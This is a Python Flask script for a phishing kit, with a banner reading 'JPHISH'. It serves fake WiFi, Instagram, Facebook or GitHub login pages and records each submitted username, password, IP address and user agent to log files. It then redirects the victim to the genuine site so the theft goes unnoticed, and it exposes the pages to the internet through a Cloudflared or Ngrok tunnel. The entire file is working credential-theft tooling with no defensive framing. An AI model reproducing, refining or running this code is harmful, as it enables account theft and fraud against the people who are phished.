from flask import Flask, request, render_template, redirect, url_for
from datetime import datetime
import os
import subprocess
import shutil
import time
import sys
import json

app = Flask(__name__, template_folder="templates", static_folder="static")

# ASCII Banner
def show_banner():
    print("""
     ██╗██████╗ ██╗  ██╗██╗███████╗██╗  ██╗
     ██║██╔══██╗██║  ██║██║██╔════╝██║  ██║
     ██║██████╔╝███████║██║███████╗███████║
██   ██║██╔═══╝ ██╔══██║██║╚════██║██╔══██║
╚█████╔╝██║     ██║  ██║██║███████║██║  ██║
 ╚════╝ ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝
    """)

# Save credentials and session data
def log_data(username, password, service, ip, user_agent):
    os.makedirs("logs", exist_ok=True)
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Save credentials
    with open('logs/credentials.txt', 'a') as f:
        f.write(f"[{timestamp}] {service}: {username}:{password}\n")
    
    # Save session (JSON format)
    session_data = {
        "timestamp": timestamp,
        "service": service,
        "username": username,
        "password": password,
        "ip": ip,
        "user_agent": user_agent
    }
    with open('logs/sessions.json', 'a') as f:
        json.dump(session_data, f)
        f.write("\n")  # Newline for each entry

# Check if running on Termux (Android)
def is_termux():
    return "com.termux" in os.environ.get("PREFIX", "")

# Install Cloudflared (if missing)
def install_cloudflared():
    try:
        if is_termux():
            subprocess.run(["pkg", "install", "-y", "cloudflared"], check=True)
        else:
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
            subprocess.run(["wget", url, "-O", "cloudflared"], check=True)
            subprocess.run(["chmod", "+x", "cloudflared"], check=True)
            subprocess.run(["sudo", "mv", "cloudflared", "/usr/local/bin/"], check=True)
        return True
    except Exception as e:
        print(f"[!] Failed to install Cloudflared: {e}")
        return False

# Start Cloudflared tunnel
def start_cloudflared(port=8080):
    tool_path = shutil.which("cloudflared") or "/usr/local/bin/cloudflared"
    if not tool_path:
        if input("[?] Cloudflared not found. Install it? (y/n): ").lower() == "y":
            if not install_cloudflared():
                return None
            tool_path = shutil.which("cloudflared") or "/usr/local/bin/cloudflared"
        else:
            return None

    try:
        process = subprocess.Popen(
            [tool_path, "tunnel", "--url", f"http://localhost:{port}"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        time.sleep(5)  # Wait for tunnel to initialize
        for line in process.stderr:
            if "trycloudflare.com" in line:
                public_url = line.split("|")[-1].strip()
                print(f"[+] Cloudflared URL: {public_url}")
                return public_url
        return None
    except Exception as e:
        print(f"[!] Cloudflared error: {e}")
        return None

# Main setup
def setup():
    show_banner()
    print("\n[+] Select Phishing Page:")
    print("1. WiFi")
    print("2. Instagram")
    print("3. Facebook")
    print("4. GitHub")
    choice = input("\nEnter choice (1-4): ").strip()

    print("\n[+] Select Tunnel:")
    print("1. Cloudflared (Recommended)")
    print("2. Ngrok")
    print("3. Localhost (No tunnel)")
    tunnel_choice = input("Enter choice (1/2/3): ").strip()

    # Configure Flask routes
    services = {
        "1": {"template": "wifi.html", "redirect": "https://google.com"},
        "2": {"template": "instagram.html", "redirect": "https://instagram.com"},
        "3": {"template": "facebook.html", "redirect": "https://facebook.com"},
        "4": {"template": "github.html", "redirect": "https://github.com"}
    }

    @app.route('/')
    def home():
        return render_template(services[choice]["template"])

    @app.route('/login', methods=['POST'])
    def login():
        username = request.form.get('username') or request.form.get('email')
        password = request.form.get('password') or request.form.get('pass')
        service = services[choice]["template"].replace('.html', '')
        ip = request.remote_addr
        user_agent = request.headers.get('User-Agent', 'Unknown')
        
        # Log data
        log_data(username, password, service, ip, user_agent)
        return redirect(services[choice]["redirect"], code=302)

    # Start tunnel
    public_url = None
    port = 8080  # Avoid port 80 (no root needed)

    if tunnel_choice == "1":
        public_url = start_cloudflared(port)
    elif tunnel_choice == "2":
        print("\n[+] Run Ngrok manually in another terminal:")
        print(f"    ngrok http {port}")
        public_url = input("[?] Paste Ngrok URL (e.g., https://abc123.ngrok.io): ").strip()
    elif tunnel_choice == "3":
        print(f"\n[+] Local URL: http://localhost:{port}")
    else:
        print("[!] Invalid choice.")
        sys.exit(1)

    # Start Flask
    print("\n[+] Starting server...")
    app.run(host='0.0.0.0', port=port)

if __name__ == '__main__':
    setup()

